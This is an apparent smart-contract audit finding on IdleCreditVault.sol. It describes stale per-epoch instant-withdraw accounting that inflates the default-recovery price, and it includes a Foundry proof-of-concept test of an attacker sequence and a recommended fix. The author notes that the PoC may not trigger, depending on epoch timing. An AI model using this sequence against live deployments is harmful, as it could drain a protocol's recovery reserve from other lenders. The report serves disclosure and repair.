### Title
Claimed instant-withdraw receipts remain in `instantWithdrawClaimsByEpoch`, inflating the default-recovery reserve and recovery price - (File: `contracts/strategies/idle/IdleCreditVault.sol`)

### Summary
When a user successfully claims a funded instant-withdraw request, `IdleCreditVault.claimInstantWithdrawRequest` clears `instantWithdrawsRequests[_user]` but never decrements `instantWithdrawsRequestsByEpoch[_user][epoch]` or the epoch aggregate `instantWithdrawClaimsByEpoch[epoch]` — those are only cleared on the defaulted-claim path (`_claimDefaultedInstantWithdrawRequest`). If the borrower later defaults in the same epoch while another instant request is still unfunded, `finalizeDefaultRecovery` treats already-paid-out receipts as prefunded reserve (`_defaultPrefundedInstantReserve`) and as outstanding claim basis (`defaultPendingClaimBasis`), inflating `defaultRecoveryPrice` above what the real token balance supports. This is the idle-tranches analog of the vesting-escrow bug: a user who already claimed is still counted as a pending claimant.

### Finding Description
In `requestInstantWithdraw`, the vault records `instantWithdrawsRequestsByEpoch[_user][currentEpoch] += _amount` and `instantWithdrawClaimsByEpoch[currentEpoch] += _amount` (`IdleCreditVault.sol:366-374`). When funds are collected, `collectInstantWithdrawFunds` decrements only `pendingInstantWithdraws` (`IdleCreditVault.sol:398-403`). On a normal claim, `claimInstantWithdrawRequest` burns the aggregate receipt and zeroes `instantWithdrawsRequests[_user]`, but leaves both per-epoch counters untouched (`IdleCreditVault.sol:387-392`).

Later, if `pendingInstantWithdraws != 0` at default finalization (some other instant request was never funded), `defaultPendingClaimBasis()` adds the stale `instantWithdrawClaimsByEpoch[epochNumber]` — which still includes the already-claimed amount — to `totalBasis` (`IdleCreditVault.sol:644-649`), and `_defaultPrefundedInstantReserve()` computes `instantBasis - pendingInstant`, counting the claimed user's payout as if those tokens were still held (`IdleCreditVault.sol:716-723`). `recoveryPrice = reserveAmount * RECOVERY_FULL / totalBasis` is then computed on phantom reserve (`IdleCreditVault.sol:685-688`), pushing the ratio toward 1 and overpaying whoever claims first from `defaultRecoveryReserve`, which only contains real tokens.

### Impact Explanation
Direct theft / insolvency of the default-recovery reserve. An attacker (any KYC-passed lender) who claims a funded instant receipt early and also holds (or controls via a second address) an unfunded instant receipt in the same epoch is paid at an inflated recovery price. The phantom portion of `prefundedReserve` corresponds to tokens already transferred to the claimed user, so payouts drawn against `defaultRecoveryReserve` exceed real holdings; earlier claimants extract more than their fair share and later defaulted-epoch claimants find the reserve drained or their transfers reverting — a quantified loss equal to the total instant amount claimed before finalization in the default epoch.

### Likelihood Explanation
Requires a specific but legitimate sequence within one epoch: an instant request funded via `getInstantWithdrawFunds`, its claim while `allowInstantWithdraw` is on, a second unfunded instant request, and a borrower default before that request is funded. Borrower defaults are a designed protocol state and `getInstantWithdrawFunds` already supports partially-funded queues (`testInstantDefault` paths exercise mixed funded/unfunded claims). The attacker merely times ordinary calls; the state-staleness does the rest. No privileged misbehavior needed.

### Recommendation
In `claimInstantWithdrawRequest`, clear the per-epoch accounting the same way `_claimDefaultedInstantWithdrawRequest` does: subtract `amount` from `instantWithdrawsRequestsByEpoch[_user][epochNumber]` and `instantWithdrawClaimsByEpoch[epochNumber]` when clearing `instantWithdrawsRequests[_user]`, so claimed receipts stop counting as pending claim basis and prefunded reserve at default finalization.

### Proof of Concept
Foundry test against the `IdleCreditVault.t.sol` harness:

```solidity
function testClaimedInstantReceiptInflatesDefaultRecovery() external {
    _setFeeParams(TL_MULTISIG, 10000, FULL_ALLOC, cdoEpoch.managementFee());

    uint256 amountWei = 10000 * ONE_SCALE;
    address attacker = makeAddr('attacker');
    address victim = makeAddr('victim');

    // attacker and victim deposit AA; second lender deposits to keep pool solvent
    _depositWithUser(attacker, amountWei, true);
    _depositWithUser(victim, amountWei, true);
    idleCDO.depositAA(amountWei);

    _startEpochAndCheckPrices(0);

    // attacker requests instant withdraw for half their position
    uint256 trancheBal = IERC20(AAtranche).balanceOf(attacker);
    vm.prank(attacker);
    uint256 claimedInstant = cdoEpoch.requestWithdraw(trancheBal / 2, address(AAtranche));

    // victim requests instant withdraw too
    uint256 victimTranche = IERC20(AAtranche).balanceOf(victim);
    vm.prank(victim);
    cdoEpoch.requestWithdraw(victimTranche / 2, address(AAtranche));

    // borrower funds ONLY the attacker's request
    vm.warp(block.timestamp + cdoEpoch.instantWithdrawDelay() + 1);
    deal(defaultUnderlying, borrower, claimedInstant);
    vm.prank(manager);
    cdoEpoch.getInstantWithdrawFunds();

    // attacker claims while epoch still runs -> stale per-epoch basis remains
    vm.prank(attacker);
    cdoEpoch.claimInstantWithdrawRequest();
    IdleCreditVault creditVault = IdleCreditVault(address(strategy));
    assertEq(creditVault.instantWithdrawsRequests(attacker), 0);
    // stale: epoch aggregate still counts attacker's paid-out receipt
    assertGt(creditVault.instantWithdrawClaimsByEpoch(creditVault.epochNumber()), 0);

    // borrower defaults at stopEpoch with the victim's request unfunded
    _stopEpochAndCheckPrices(0, initialProvidedApr, 0);
    assertTrue(cdoEpoch.defaulted());

    // finalize with a fixed external recovery
    uint256 recovered = cdoEpoch.getContractValue() / 2;
    deal(defaultUnderlying, manager, recovered);
    vm.startPrank(manager);
    IERC20Detailed(defaultUnderlying).approve(address(strategy), recovered);
    cdoEpoch.finalizeDefault(recovered, manager);
    vm.stopPrank();

    // defaultRecoveryPrice is inflated by phantom prefunded reserve equal to
    // `claimedInstant`, overpaying the victim's unfunded receipt and leaving the
    // reserve short for subsequent claimants.
    uint256 reserveReal = IERC20Detailed(defaultUnderlying).balanceOf(address(strategy));
    uint256 basisReal = creditVault.pendingWithdraws()
        + creditVault.instantWithdrawClaimsByEpoch(creditVault.defaultRecoveryEpoch())
        - claimedInstant; // attacker's receipt is already paid, not real basis
    assertGt(creditVault.defaultRecoveryPrice() * basisReal / 1e18, reserveReal);
}
```

The invariant broken is "one receipt, one payout against real reserve": a claimed receipt continues to count both as outstanding claim basis and as prefunded reserve. Cited code: `requestInstantWithdraw`/`claimInstantWithdrawRequest` at `contracts/strategies/idle/IdleCreditVault.sol:356-393`, `_defaultPrefundedInstantReserve` at `:716-723`, `defaultPendingClaimBasis` at `:644-649`, `finalizeDefaultRecovery` at `:685-696`, and `_claimDefaultedInstantWithdrawRequest` (the only place per-epoch instant entries are cleared) at `:842-856`.

One caveat: the PoC's exact accounting assertions depend on whether `epochNumber` at request time equals `defaultRecoveryEpoch` — `epochNumber` increments in `deposit()` when an epoch is running (`IdleCreditVault.sol:607-610`), i.e., at stopEpoch. If the increment lands before `finalizeDefaultRecovery` reads `instantWithdrawClaimsByEpoch[epochNumber]`, the stale entries from the previous epoch would be keyed differently and the inflated path may not trigger; that boundary should be verified against the actual epochNumber timeline in the test harness, but the missing cleanup in `claimInstantWithdrawRequest` is unconditional regardless.
